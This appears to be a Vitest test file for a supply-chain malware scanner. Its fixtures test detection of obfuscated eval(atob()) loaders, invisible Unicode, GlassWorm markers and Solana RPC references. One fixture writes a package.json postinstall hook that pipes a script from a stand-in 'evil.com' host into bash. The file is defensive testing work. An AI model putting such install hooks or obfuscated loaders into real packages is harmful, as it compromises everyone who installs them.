import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Core Scanner", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("should return a clean report for an empty directory", async () => {
    const report = await scan({
      target: tempDir,
      format: "text",
    });

    // v4.9: SLSA_LEVEL_0 (info severity, score=1) is emitted for directories
    // without any build scripts — this is a posture finding, not a security alert.
    // Verify no actual security/malware findings are present.
    const securityFindings = report.findings.filter(
      (f) => !f.rule.startsWith("SLSA_"),
    );
    expect(securityFindings).toHaveLength(0);
    expect(report.scanType).toBe("directory");
    expect(report.summary.critical).toBe(0);
    expect(report.summary.high).toBe(0);
    expect(report.summary.medium).toBe(0);
    expect(report.summary.low).toBe(0);
  });

  it("should detect GlassWorm marker variable", async () => {
    fs.writeFileSync(
      path.join(tempDir, "malicious.js"),
      'const lzcdrtfxyqiplpd = "marker";',
    );

    const report = await scan({ target: tempDir, format: "text" });

    expect(report.findings.length).toBeGreaterThan(0);
    const marker = report.findings.find((f) => f.rule === "GLASSWORM_MARKER");
    expect(marker).toBeDefined();
    expect(marker?.severity).toBe("critical");
  });

  it("should detect eval(atob()) pattern", async () => {
    fs.writeFileSync(
      path.join(tempDir, "obfuscated.js"),
      'eval(atob("dGVzdA=="));',
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "EVAL_ATOB");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("critical");
  });

  it("should detect eval(Buffer.from()) pattern", async () => {
    fs.writeFileSync(
      path.join(tempDir, "buffer-eval.js"),
      'eval(Buffer.from("dGVzdA==", "base64").toString());',
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "EVAL_BUFFER");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("critical");
  });

  it("should detect new Function(atob()) pattern", async () => {
    fs.writeFileSync(
      path.join(tempDir, "func-atob.js"),
      'new Function(atob("dGVzdA=="))();',
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "FUNCTION_ATOB");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("critical");
  });

  it("should detect invisible Unicode characters", async () => {
    // Create file with zero-width spaces
    const content = `const x = "normal\u200B\u200B\u200B\u200Btext";`;
    fs.writeFileSync(path.join(tempDir, "unicode.js"), content);

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "INVISIBLE_UNICODE");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect suspicious i.js files", async () => {
    fs.writeFileSync(path.join(tempDir, "i.js"), "module.exports = {};");

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "SUSPICIOUS_I_JS");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect suspicious init.json files", async () => {
    fs.writeFileSync(
      path.join(tempDir, "init.json"),
      JSON.stringify({ config: true }),
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find(
      (f) => f.rule === "SUSPICIOUS_INIT_JSON",
    );
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect Solana mainnet references", async () => {
    fs.writeFileSync(
      path.join(tempDir, "c2.js"),
      'const rpc = "https://api.mainnet-beta.solana.com";',
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "SOLANA_MAINNET");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("medium");
  });

  it("should detect suspicious postinstall scripts in package.json", async () => {
    const pkg = {
      name: "test-pkg",
      version: "1.0.0",
      scripts: {
        postinstall: 'curl https://evil.com/payload.sh | bash',
      },
    };
    fs.writeFileSync(
      path.join(tempDir, "package.json"),
      JSON.stringify(pkg, null, 2),
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "SCRIPT_CURL_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("critical");
  });

  it("should not scan node_modules", async () => {
    const nmDir = path.join(tempDir, "node_modules", "evil-pkg");
    fs.mkdirSync(nmDir, { recursive: true });
    fs.writeFileSync(
      path.join(nmDir, "malicious.js"),
      'eval(atob("dGVzdA=="));',
    );

    const report = await scan({ target: tempDir, format: "text" });

    // Should not find anything since node_modules is skipped
    const finding = report.findings.find((f) => f.rule === "EVAL_ATOB");
    expect(finding).toBeUndefined();
  });

  it("should respect minSeverity filter", async () => {
    fs.writeFileSync(
      path.join(tempDir, "mixed.js"),
      [
        'eval(atob("dGVzdA=="));',
        'const rpc = "https://api.mainnet-beta.solana.com";',
      ].join("\n"),
    );

    const report = await scan({
      target: tempDir,
      format: "text",
      minSeverity: "critical",
    });

    // Should only have critical findings, no medium
    expect(report.findings.every((f) => f.severity === "critical")).toBe(true);
  });

  it("should respect excludeRules filter", async () => {
    fs.writeFileSync(
      path.join(tempDir, "eval.js"),
      'eval(atob("dGVzdA=="));',
    );

    const report = await scan({
      target: tempDir,
      format: "text",
      excludeRules: ["EVAL_ATOB"],
    });

    const finding = report.findings.find((f) => f.rule === "EVAL_ATOB");
    expect(finding).toBeUndefined();
  });

  it("should calculate score correctly", async () => {
    // One critical finding = 25 points
    fs.writeFileSync(
      path.join(tempDir, "critical.js"),
      'eval(atob("dGVzdA=="));',
    );

    const report = await scan({ target: tempDir, format: "text" });

    expect(report.score).toBeGreaterThanOrEqual(25);
    expect(report.riskLevel).not.toBe("clean");
  });

  it("should handle non-existent directories", async () => {
    await expect(
      scan({ target: "/nonexistent/path", format: "text" }),
    ).rejects.toThrow("does not exist");
  });

  it("should include file and line information in findings", async () => {
    fs.writeFileSync(
      path.join(tempDir, "located.js"),
      [
        "// line 1",
        "// line 2",
        'eval(atob("dGVzdA=="));',
        "// line 4",
      ].join("\n"),
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "EVAL_ATOB");
    expect(finding?.file).toBe("located.js");
    expect(finding?.line).toBe(3);
  });

  it("should scan subdirectories", async () => {
    const subDir = path.join(tempDir, "src", "lib");
    fs.mkdirSync(subDir, { recursive: true });
    fs.writeFileSync(
      path.join(subDir, "deep.js"),
      'eval(atob("dGVzdA=="));',
    );

    const report = await scan({ target: tempDir, format: "text" });

    const finding = report.findings.find((f) => f.rule === "EVAL_ATOB");
    expect(finding).toBeDefined();
    expect(finding?.file).toContain("src/lib/deep.js");
  });

  it("should generate recommendations for findings", async () => {
    fs.writeFileSync(
      path.join(tempDir, "malicious.js"),
      'const lzcdrtfxyqiplpd = true;\neval(atob("x"));',
    );

    const report = await scan({ target: tempDir, format: "text" });

    expect(report.recommendations.length).toBeGreaterThan(0);
    expect(
      report.recommendations.some((r) => r.includes("GlassWorm")),
    ).toBe(true);
  });

  it("should skip files matched by an ignore: glob in the policy config", async () => {
    fs.writeFileSync(
      path.join(tempDir, ".supply-chain-guard.yml"),
      ["ignore:", "  - vendor/**"].join("\n"),
    );
    const vendorDir = path.join(tempDir, "vendor");
    fs.mkdirSync(vendorDir, { recursive: true });
    fs.writeFileSync(path.join(vendorDir, "evil.js"), 'eval(atob("dGVzdA=="));');
    fs.writeFileSync(path.join(tempDir, "keep.js"), 'eval(atob("dGVzdA=="));');

    const report = await scan({ target: tempDir, format: "text" });

    const evalFindings = report.findings.filter((f) => f.rule === "EVAL_ATOB");
    expect(evalFindings.some((f) => f.file === "keep.js")).toBe(true);
    expect(evalFindings.some((f) => (f.file ?? "").startsWith("vendor/"))).toBe(false);
  });

  it("should honor an inline scg-ignore-next-line directive during a scan", async () => {
    fs.writeFileSync(
      path.join(tempDir, "inline.js"),
      [
        "// scg-ignore-next-line EVAL_ATOB reviewed",
        'eval(atob("dGVzdA=="));', // line 2 - suppressed by the directive above
        'eval(atob("dGVzdA=="));', // line 3 - still reported
      ].join("\n"),
    );

    const report = await scan({ target: tempDir, format: "text" });

    const evalFindings = report.findings.filter((f) => f.rule === "EVAL_ATOB");
    expect(evalFindings).toHaveLength(1);
    expect(evalFindings[0].line).toBe(3);
  });
});
